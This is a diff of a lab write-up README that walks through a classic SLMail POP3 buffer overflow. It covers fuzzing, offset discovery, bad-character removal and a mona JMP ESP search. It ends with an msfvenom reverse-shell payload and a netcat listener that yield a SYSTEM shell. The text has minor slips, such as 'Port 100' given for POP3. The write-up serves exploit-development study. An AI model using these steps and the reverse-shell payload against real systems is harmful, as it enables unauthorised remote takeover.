@@ -8,83 +8,30 @@ This project is centered on understanding and executing a Windows buffer overflo
 - **Payload Crafting and Exploitation:** Utilizing MSFvenom to generate a specific payload, followed by setting breakpoints and adjusting scripts to gain control over the program's execution. Successfully exploiting the vulnerability led to obtaining a reverse shell on the target machine.
 
 ## Walkthrough:
-
-- Initialized the BOF machine, accessed the command prompt as an administrator, and ran **“slmgr /rearm”**.
-
-
-- Ran **“ipconfig”** to determine the machine's IP address as **“10.0.2.10”**.
-
-
-- Installed **“12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe”** on the Windows VM and rebooted.
-
-
-- Created a desktop shortcut for **“SLmail.cpl”**.
-
-
-- Opened both **“SLmail.cpl”** & **“Immunity debugger”** with administrative rights.
-
-
-- In **“Immunity debugger”**, attached the **“SLmail.exe”** file and ensured it's actively running.
-
-
-- On the Kali machine, downloaded the fuzzer script labeled **“fuzzerScript.py”** and stored it in a **“BOF”** folder on the desktop.
-
-
-- Created and edited a file named **“fuzzy.py”** in the same folder.
-
-
-- Updated **“fuzzy.py”** line 13 with the target IP address and port, then saved changes.
-
-
-- Conducted an nmap scan on the target VM to confirm open ports and noted the active **“pop3”** protocol.
-
-
-- Navigated to the BOF directory and executed the **“fuzzy.py”** script using the **“python2 fuzzy.py”** command.
-
-
-- Observed the EIP update to **“41414141”** in Immunity debugger.
-
-
-- Generated an MSF pattern of 3000 bytes using the **“msf-pattern_create -l 3000”** command.
-
-
-- Updated the **“fuzzy.py”** script's buffer with the generated MSF pattern and removed unnecessary loops.
-
-
-- Reset SLmail.cpl and the Immunity debugger.
-
-
-- Re-executed the **“fuzzy.py”** script and noted the updated EIP value in Immunity debugger.
-
-
-- Determined the exact memory offset using the **“msf-pattern_offset -l 3000 -q 39694438”** command.
-
-
-- Validated the offset by adjusting the buffer in **“fuzzy.py”** and observing the Immunity debugger's EIP value.
-
-
-- Incorporated a list of potential bad characters into the **“fuzzy.py”** buffer.
-
-
-- Re-executed the adjusted **“fuzzy.py”** script and followed the ESP in dump within Immunity debugger.
-
-
-- Identified certain characters as **"bad"** and refined the **"fuzzy.py"** buffer.
-
-
-- Re-executed the **"fuzzy.py"** script with the refined buffer.
-
-
-- Searched for mona modules using the **“!mona modules”** command in Immunity debugger.
-
-
-- Identified a suitable dll with **“!mona find -s "\xff\xe4" -m SLMFC.DLL”**.
-
-
-- Crafted a shell code using the **“msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”** command.
-
-
-- Integrated the shell code into **“fuzzy.py”** and adjusted the buffer accordingly.
-
-
-- Restarted SLmail, ran the **“fuzzy.py”** script, and achieved system access with highest-level permissions as confirmed by the **“whoami”** command.
+- Opened BOF machine, accessed command prompt as admin, ran “slmgr /rearm” and “ipconfig”. Identified IP as “10.0.2.10”.
+- Installed “12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe”, rebooted VM, and created a shortcut for “SLmail.cpl”.
+- Launched “SLmail.cpl” & “Immunity debugger” as admin.
+- In “Immunity debugger”, attached the “SLmail.exe” file and ensured its active state.
+- On my Kali machine, downloaded the “fuzzerScript.py” to the BOF folder on the desktop.
+- In the same directory, created and edited “fuzzy.py”, updating the target IP address on line 13.
+- Performed an nmap scan on the target VM. Identified Port 100 open with “pop3” protocol.
+- Updated the “fuzzy.py” with the target IP and port.
+- In the BOF directory, executed the script using “python2 fuzzy.py”.
+- In Immunity debugger, noticed EIP showing “41414141”.
+- Generated an MSF pattern using “msf-pattern_create -l 3000”, producing a unique 3000-byte pattern to identify program control flow.
+- Copied this pattern into the “fuzzy.py” script buffer, removing the unnecessary counter and loop.
+- Reset both SLmail.cpl and Immunity debugger. Ensured SLmail was active in Immunity, then ran “python2 fuzzy.py” from Kali.
+- Observed EIP in Immunity debugger updated to “39694438”.
+- Determined memory control location using “msf-pattern_offset -l 3000 -q 39694438”, identifying offset “2606”.
+- Validated this by modifying “fuzzy.py” buffer to “A * 2606 + B * 4”.
+- Reset SLmail.cpl and Immunity debugger, then executed “python2 fuzzy.py”. Noticed EIP as “42424242” and EBP as “41414141” in Immunity debugger.
+- Updated “fuzzy.py” to include bad characters, and modified the buffer accordingly.
+- Restarted slmail.clp and Immunity debugger. Ran “python fuzzy.py” from Kali, noting an output of 2865 bytes.
+- Followed ESP in Immunity debugger's dump, identifying sequences to be removed from “fuzzy.py”.
+- Repeated the process with updated “fuzzy.py”, observing a byte decrease in output.
+- Made another update to “fuzzy.py”, removing the identified bad character.
+- Reset tools, searched for mona modules in Immunity debugger, then searched for the appropriate dll.
+- Crafted shellcode with “msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”.
+- Updated “fuzzy.py” with the crafted shell code.
+- Set up a listener on Kali with “nc -lvp 4444”.
+- Restarted SLmail, ran “fuzzy.py”. The netcat listener received the code, granting system access. Confirmed with “whoami” command showing “nt authority\system”.
